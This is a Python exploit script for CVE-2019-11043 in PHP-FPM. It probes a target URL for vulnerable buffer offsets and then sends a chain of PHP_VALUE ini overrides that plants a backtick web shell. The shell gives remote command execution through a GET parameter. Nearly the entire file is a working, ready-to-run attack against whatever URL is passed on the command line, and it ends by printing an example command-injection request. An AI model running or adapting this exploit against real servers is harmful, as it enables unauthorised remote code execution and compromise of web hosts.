# Author:
# 0th3rs Security Team
# 2019.11.06

import requests 
import http.client
import urllib.request
import argparse


# This is old exp
# exp_chain = {
# 	"session.auto_start=1",
#     "short_open_tag=1",
#     "html_errors=0",
#     "include_path=/tmp",
#     "auto_prepend_file=a",
#     "log_errors=1",
#     "error_reporting=2",
#     "error_log=/tmp/a",
#     "extension_dir=\"<?=`\"",
#     "extension=\"$_GET[a]`?>\"",
# }

# Size 34 Bytes
# error_reporting=2;;;;;;
# short_open_tag=1;;;;;;;
# html_errors=0;;;;;;;;;;
# log_errors=1;;;;;;;;;;;
# output_handler=<?/*;;;;
# output_handler=*/`;;;;;
# output_handler='';;;;;;
# extension_dir='`?>';;;;
# extension=$_GET[a];;;;;
# error_log=/tmp/t;;;;;;;
# include_path=/tmp;;;;;;

orange_chain = [
    "error_reporting=2",
    "short_open_tag=1",
    "html_errors=0",
    "log_errors=1",
    "error_log=/tmp/l",	
    "include_path=/tmp",	# multi 5 
    "output_handler=<?/*",	
    "output_handler=*/`",	
    "output_handler=''",	
    "extension_dir='`?>'",	
    "extension=$_GET[a]",	
    "auto_prepend_file=l",	# multi 11 
]

headers = {
	# "Host": "10.211.55.6",
	"User-Agent": "Mozilla/5.0",
	'D-Gisos':'',
	'Ebut':'mamku tvoyu',
	'Accept':None,
	'Connection':None,
	'Accept-Encoding':'',
}

base_payload = '/PHP_VALUE%0a'

def judgeTarget(target):
	print(use_style('Judging target ...', fore='yellow'))
	check_payload = base_payload + 'session.auto_start=1;;;?'
	quit_check_payload = base_payload + 'session.auto_start=0;;;?'
	q_len = 0
	p_len = 0
	target_process_num = 1
	for k in range(1785, 1795):
	# for k in range(1789, 1795):
		payload = check_payload + k * 'Q'
		exp = False
		for i in range(300, -1, -1):
			# print('Padding : ' + str(i))
			headers['D-Gisos'] = '+' * i
			res = requests.get(target + payload, headers=headers)

			if 'Set-Cookie' in res.headers.keys():
				print(use_style('Target seems vulnerable!', fore='red'))
				# Judge target php worker-process num
				for _ in range(0, 1000):
					res = requests.get(target)
					if 'Set-Cookie' in res.headers.keys():
						# Unset auto_session
						for j in range(0, target_process_num):
							payload = quit_check_payload + k * 'Q'
							res = requests.get(target + payload, headers=headers)
						break
					target_process_num += 1
				q_len = k
				p_len = i
				exp = True
				break
		if exp:
			break
	if q_len == 0 and p_len == 0:
		print(use_style('Target seems unvulnerable ... ', fore='yellow'))
	# print(target_process_num)
	return q_len, p_len, target_process_num


def exploitTarget(target, q, p, target_process_num):
	print('PWN target ...')
	for k,term in enumerate(orange_chain):
		payload = base_payload + term.ljust(23, ';').replace('?','%3f')
		payload += '?' + q*'Q'
		headers['D-Gisos'] = '+' * p

		# Fuck multi-worker processes
		if k in [5, 11]:
			for i in range(0, target_process_num):
				requests.get(target + payload, headers=headers)
		else:
			requests.get(target + payload, headers=headers)
			# Skip the useless worker-process
			for _ in range(0, target_process_num - 1):
				requests.get(target)

		# Sometimes need burst
		# for j in range(p-50, p+50):
			# headers['D-Gisos'] = '+' * j
			# res = requests.get(target + payload, headers=headers)

	print(use_style('PWN done , try it . ', fore='green'))
	print('Example: {}?a=%0asleep+5%0a'.format(target))



STYLE = {
    'fore': {
            'black': 30, 'red': 31, 'green': 32, 'yellow': 33,
            'blue': 34, 'purple': 35, 'cyan': 36, 'white': 37,
    },
    'back': {
            'black': 40, 'red': 41, 'green': 42, 'yellow': 43,
            'blue': 44, 'purple': 45, 'cyan': 46, 'white': 47,
    },
    'mode': {
            'bold': 1, 'underline': 4, 'blink': 5, 'invert': 7,
    },
    'default': {
            'end': 0,
    }
}

def use_style(string, mode='', fore='', back=''):
    mode = '%s' % STYLE['mode'][mode] if mode in STYLE['mode'] else ''
    fore = '%s' % STYLE['fore'][fore] if fore in STYLE['fore'] else ''
    back = '%s' % STYLE['back'][back] if back in STYLE['back'] else ''
    style = ';'.join([s for s in [mode, fore, back] if s])
    style = '\033[%sm' % style if style else ''
    end = '\033[%sm' % STYLE['default']['end'] if style else ''
    return '%s%s%s' % (style, string, end)




if __name__ == '__main__':
	# url = 'http://10.211.55.6/index.php'
	parser = argparse.ArgumentParser()
	parser.add_argument('-u', '--url', help='exploit target')
	args = parser.parse_args()

	print(use_style('====== Designed by 0th3rs Security Team======', mode='bold', fore='green'))
	url = args.url
	if not url:
		exit('Example: python cve_2019_11043.py -u http://xxxx/index.php')

	q, p, target_process_num = judgeTarget(url)
	print('Query padding: {}, Data padding: {}'.format(q, p) )
	if q!=0 and p !=0:
		exploitTarget(url, q, p, target_process_num)
